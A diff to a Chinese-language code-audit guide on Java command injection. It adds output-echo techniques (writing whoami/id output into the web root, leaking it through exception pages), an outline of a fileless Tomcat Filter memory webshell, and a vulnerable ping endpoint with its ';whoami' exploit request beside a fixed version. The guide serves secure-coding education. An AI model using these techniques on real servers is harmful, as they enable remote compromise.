@@ -164,6 +164,48 @@ Windows 和 Linux 在：
 - 表达式引擎
 - 反序列化链
 
+## 回显技巧
+
+命令执行点往往没有回显：`Runtime.exec()` 默认不返回输出，输出留在管道里没人读。按目标环境选回显方式。
+
+### 1. 写文件回显（最通用）
+
+让命令把输出重定向到 Web 根目录下的静态文件，再走 HTTP 读回：
+
+```java
+// Windows：确认 webroot 可写后，把输出落到可被静态资源映射的路径
+String[] cmd = {"cmd", "/c", "whoami > ..\\webapps\\ROOT\\1.txt"};
+new ProcessBuilder(cmd).start();
+```
+
+```java
+// Linux：注意重定向是 shell 语法，必须经 /bin/sh -c，exec(String) 直传不生效
+String[] cmd = {"/bin/sh", "-c", "id > /var/www/html/1.txt"};
+new ProcessBuilder(cmd).start();
+```
+
+随后请求 `http://target/1.txt` 即可读回命令输出。关键点：确认 Web 根目录路径（报错泄露 / actuator / 已知框架默认路径）且该目录可写、文件落在静态资源可访问的位置。
+
+### 2. 异常回显
+
+把命令输出塞进异常 message，借全局异常处理器或 debug 报错页回显到 HTTP 响应：
+
+```java
+// 读一次进程输出，包装成异常抛出，报错页会把 message 原样吐出来
+Process p = Runtime.getRuntime().exec(new String[]{"cmd", "/c", "whoami"});
+byte[] buf = new byte[1024];
+int len = p.getInputStream().read(buf);
+throw new Exception(new String(buf, 0, len));   // 异常信息即命令输出
+```
+
+前提：应用处于 debug/开发模式，异常 message 没有被统一错误页吞掉。
+
+### 3. 内存马一句话思路
+
+有代码执行能力但落地 webshell 文件会被查杀 / 目录不可写时，改注册 Tomcat Filter 型内存马：动态创建 Filter 并注册到 `ServletContext`（反射调用 `ApplicationContext#addFilter` 突破访问限制），Filter 内拦截指定 URL 参数并执行命令——无文件落盘、特征小，缺点是重启即失效。
+
+注入代码与各容器（Tomcat/Resin/WebLogic）差异详见 [Webshell-Bypass](../penetration/Webshell-Bypass.md)。
+
 ## 防御要点
 ### 1. 避免直接调用系统命令
 优先使用 Java 原生 API 处理文件、网络、压缩等操作。
@@ -177,6 +219,81 @@ Windows 和 Linux 在：
 ### 4. 最小权限
 运行 Java 服务的账户不应具备高权限和敏感目录写权限。
 
+## 完整审计对照
+
+同一段业务（ping 诊断接口），漏洞版与修复版对照。
+
+### 漏洞版（Controller 接收 ip -> 拼接 -> Runtime.exec）
+
+```java
+@RestController
+public class PingController {
+
+    @GetMapping("/ping")
+    public String ping(@RequestParam("ip") String ip) {
+        // 漏洞：用户输入直接拼接进 shell 命令，且显式调用了 /bin/sh -c
+        String cmd = "ping -c 4 " + ip;
+        try {
+            Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
+            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
+            StringBuilder sb = new StringBuilder();
+            String line;
+            while ((line = br.readLine()) != null) {
+                sb.append(line).append("\n");
+            }
+            return sb.toString();   // 还把输出原样回显，攻击者可直接看结果
+        } catch (Exception e) {
+            return e.toString();
+        }
+    }
+}
+```
+
+利用报文（分号拼接即注入）：
+
+```http
+GET /ping?ip=127.0.0.1;whoami HTTP/1.1
+Host: target.com
+```
+
+### 修复版（白名单校验 + 参数化调用）
+
+```java
+@RestController
+public class PingController {
+
+    // 白名单：只放行 IPv4/IPv6 合法字符，其余输入直接拒绝
+    private static final Pattern IP_PATTERN =
+            Pattern.compile("^[0-9a-fA-F.:]{1,45}$");
+
+    @GetMapping("/ping")
+    public String ping(@RequestParam("ip") String ip) {
+        // ① 白名单校验：不符合 IP 格式直接拒绝，杜绝任何特殊字符进入命令
+        if (!IP_PATTERN.matcher(ip).matches()) {
+            return "invalid ip";
+        }
+        try {
+            // ② 参数化调用：不经 shell，命令与参数全部固化，ip 只能作为最后一个参数
+            ProcessBuilder pb = new ProcessBuilder("ping", "-c", "4", ip);
+            pb.redirectErrorStream(true);
+            Process p = pb.start();
+            // ③ 超时控制：防止进程挂死拖垮服务
+            if (!p.waitFor(5, TimeUnit.SECONDS)) {
+                p.destroyForcibly();
+                return "timeout";
+            }
+            String out = new String(p.getInputStream().readAllBytes());
+            // ④ 回显最小化：只返回前 1KB，避免输出内容被二次利用
+            return out.substring(0, Math.min(out.length(), 1024));
+        } catch (Exception e) {
+            return "error";   // 不回显异常细节
+        }
+    }
+}
+```
+
+修复三要素：**白名单校验输入 → 不经 shell 的参数化调用 → 最小信息回显**，缺一不可。只做黑名单过滤（删空格、删分号）仍可被 `$IFS`、编码、换行等手法绕过。
+
 ## 速查清单
 - 先搜 `Runtime`、`ProcessBuilder`、`ScriptEngineManager`、`GroovyShell`
 - 先分清命令执行、参数注入还是脚本执行
@@ -186,3 +303,5 @@ Windows 和 Linux 在：
 
 ## Reference
 - [Java 代码审计之 RCE（远程命令执行）](https://blog.51cto.com/u_13963323/5066457)
+- [GTFOBins](https://gtfobins.github.io/) —— Java 参数注入场景下可被滥用的系统命令速查
+- [Oracle - Secure Coding Guidelines for Java SE](https://www.oracle.com/java/technologies/javase/seccodeguide.html) —— Java 安全编码规范
